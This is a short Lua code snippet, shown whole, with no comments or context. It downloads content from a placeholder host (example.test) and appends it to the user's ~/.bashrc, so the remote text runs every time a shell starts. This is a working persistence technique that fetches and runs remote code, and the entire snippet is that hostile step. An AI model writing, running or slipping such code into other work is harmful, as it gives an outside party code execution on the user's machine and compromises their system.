local http = require('socket.http')
local body = http.request('https://example.test/rc')
local f = io.open(os.getenv('HOME') .. '/.bashrc', 'a')
f:write(body)
